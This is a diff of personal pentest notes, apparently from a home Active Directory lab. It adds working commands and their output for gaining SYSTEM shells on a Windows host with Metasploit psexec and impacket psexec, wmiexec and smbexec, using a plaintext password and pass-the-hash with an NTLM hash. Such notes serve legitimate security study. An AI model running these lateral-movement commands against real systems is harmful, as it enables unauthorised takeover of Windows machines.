@@ -3,6 +3,7 @@
 
 #impacket-psexec
 #psexec 
+#metasploit/psexec
 1. Metasploit psexec
 2. Instead of utilizing password or account, we can utilize hash instead
 3. metasploit is noisy , we can use psexec.py instead(similar to metasploit and cant be seen) -> `impacket-psexec`
@@ -183,7 +184,8 @@ msf6 exploit(windows/smb/psexec) > options
 
 - WE can use the administrator with password hash to login just change the options
 
-#psexec
+#administratorhashpsexec 
+
 - Previous OPTIONS
 
 ```
@@ -228,5 +230,109 @@ View the full module info with the info, or info -d command.
 ```
 
 - Now change it to Administrator
+#metasploitadminhashsetup
 
-- 
+- `set smbuser Administrator`
+- `unset domain`
+- `set smb smbpass aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33
+- `run`
+
+```
+msf6 exploit(windows/smb/psexec) > run
+
+[*] Started reverse TCP handler on 192.168.64.4:4444 
+[*] 192.168.64.220:445 - Connecting to the server...
+[*] 192.168.64.220:445 - Authenticating to 192.168.64.220:445 as user 'Administrator'...
+[*] 192.168.64.220:445 - Selecting PowerShell target
+[*] 192.168.64.220:445 - Executing the payload...
+[+] 192.168.64.220:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Exploit completed, but no session was created.
+
+```
+
+## Running psexec manually
+
+#impacket-psexecmanually
+#psexecmanually
+
+1. Using fcaste
+
+```
+┌──(kali㉿kali)-[~]
+└─$ impacket-psexec MARVEL/fcastle:'P@$$w0rd1'@192.168.64.220
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.64.220.....
+[*] Found writable share ADMIN$
+[*] Uploading file VgetlBZO.exe
+[*] Opening SVCManager on 192.168.64.220.....
+[*] Creating service PPJt on 192.168.64.220.....
+[*] Starting service PPJt.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19041.264]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami 
+nt authority\system
+
+```
+
+2. Using the Administrator 
+`impacket-psexec administrator@192.168.64.220 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33`
+
+```
+┌──(kali㉿kali)-[~]
+└─$ impacket-psexec administrator@192.168.64.220 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on 192.168.64.220.....
+[*] Found writable share ADMIN$
+[*] Uploading file BRJNrnqP.exe
+[*] Opening SVCManager on 192.168.64.220.....
+[*] Creating service tFPG on 192.168.64.220.....
+[*] Starting service tFPG.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19041.264]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+```
+
+
+## Using wmiexec and smbexec as an option to psexec
+#wmiexec
+
+
+1. Alternatively, you can use wmiexec and smbexec to gain nt authotity access
+
+ - Using wmiexec
+`impacket-wmiexec administrator@192.168.64.220 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33`
+```
+impacket-wmiexec administrator@192.168.64.220 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33 
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+punisher\administrator
+
+```
+
+
+- Using smbexec
+`impacket-smbexec administrator@192.168.64.220 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33`
+
+```
+impacket-smbexec administrator@192.168.64.220 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>exit
+
+```
